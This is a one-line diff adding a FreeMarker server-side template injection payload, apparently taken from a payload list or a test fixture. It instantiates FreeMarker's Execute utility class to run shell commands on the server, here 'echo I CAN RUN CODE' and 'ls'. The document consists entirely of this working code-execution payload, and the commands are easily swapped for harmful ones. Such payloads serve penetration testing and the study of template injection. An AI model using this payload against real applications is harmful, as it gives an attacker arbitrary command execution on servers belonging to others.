@@ -1,0 +1,1 @@
+<#assign exec="freemarker.template.utility.Execute"?new()> ${exec("echo I CAN RUN CODE")} ${exec("ls")}
